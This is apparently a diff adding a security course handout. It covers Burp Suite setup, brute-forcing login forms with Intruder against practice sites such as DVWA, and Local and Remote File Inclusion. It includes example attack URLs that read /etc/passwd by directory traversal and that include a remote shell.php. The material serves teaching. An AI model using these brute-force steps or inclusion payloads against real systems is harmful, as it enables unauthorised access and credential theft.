@@ -1,0 +1,90 @@
+							Session 14
+							===========
+
+
+
+INTRODUCTION TO BURP SUITE
+===========================
+Burp Suite is a graphical tool for testing Web application security. Burp Scanner can automatically move parameters between different locations, such as URL parameters and cookies for doing Vulnerability Assessment and Penetration Testing of a  Web Application.
+
+The tool is written in Java and developed by a organization named PortSwigger Security. We also use Burp Suite for Tampering of data moving through one Node to another. 
+There are particularly 2 Versions of Burp Suite : 
+
+=	Professional Version $349.00 per user, per year having all the functions.
+=	Community Edition which is free of cost.
+
+
+Features to be discussed in Burpesuite :
+Spider
+Repeater
+Intruder
+Proxy
+
+
+
+BRUTE FORCING USING BURP SUITE
+===============================
+
+Brute Force Attack : Brute forcing is a trial and error method used by application programs to decode encrypted data such as passwords by hit and trial through exhaustive effort by  employing intellectual strategies.
+
+Let us first understand the flaw through which Brute Forcing is working. Brute Forcing is working because of the flaw of Filtration on Login Forms. If there is not any extra layer of security or any limit to enter the credentials, Brute Forcing can be done.
+
+
+STEPS :
+=======
+
+=>	Setting Up Proxy Settings in Browser
+	-	Browser Setting > Network Setting > Proxy Configuration > Manual Proxy > Enter a Socket with local host > 127.0.0.1:8080
+	-	Check mark it  > Use this proxy server for all protocol
+	-	Clear all details from "No Proxy for".
+	-	Click on Apply.
+For proper funtioning download the certficate from http://burp.
+import the certificate and tick all the options provided and click on ok.
+
+
+Now open burpsuit:
+=>	Go to Proxy > Options > Enter Proxy Socket which we entered on the 			Browser Settings.
+=>	Click on Intercept > Intercept is ON (This will start capturing moving 		packets)
+	On entering the credentials or any request and pressing on Enter or ok the request will go to burpesuit first before going to the actual page.
+	So it will blink until unless you dont open burpesuit.
+=>	Burp Suite have captured a Packet, Select that Packet from Burp Suite 		containing credentials > Right Click > Send to Intruder.
+=>	Turn Off Intercept Mode.
+=>	Go to Intruder > Position > Clear
+=>	Select the Parameters you want to start brute forcing on.
+	-	Select value of username < Add 	
+	-	Select value of password < Add 
+
+=>	Go to Payloads > Setting up a Wordlist in Payloads > Giving a Default 		list on any random Credentials for Login into DVWA or demo.testfire.net
+=>	Select Values for Payloads
+		Payload : 1 > dic file of username.
+		Payload : 2 > dic. file for password.
+=>	Options > Grep Match > Clear
+=>	Username and/or password incorrect. < Add.   
+=>	Click on “Start Attack”
+=>	Find out the Correct Username and Password and enter.
+
+
+
+=x=x=x=x=x=x=x=x=x=x=x=x=x=x=x=x=x=x=x=x=x=x=x=x=x=x=x=x=x=x=x=x=x=x=x=x=x=
+
+Local File Inclusion (also known as LFI)
+==========================================
+It is the process of including files, that are already locally present on the server, through the exploiting of vulnerable inclusion procedures implemented in the application. This vulnerability occurs, for example, when a page receives, as input, the path to the file that has to be included and this input is not properly sanitized, allowing directory traversal characters (such as dot-dot-slash) to be injected. Although most examples point to vulnerable PHP scripts, we should keep in mind that it is also common in other technologies such as JSP, ASP and others. 
+
+ex: http://vulnerable_host/preview.php?file=../../../../etc/passwd
+
+Remote File Inclusion (also known as RFI) 
+============================================
+It is the process of including remote files through the exploiting of vulnerable inclusion procedures implemented in the application. This vulnerability occurs, for example, when a page receives, as input, the path to the file that has to be included and this input is not properly sanitized, allowing external URL to be injected. Although most examples point to vulnerable PHP scripts, we should keep in mind that it is also common in other technologies such as JSP, ASP and others. 
+
+ex: www.xyz.com/contacts.php?page=http://www.abc.com/shell.php
+
+
+
+
+
+
+
+
+
+
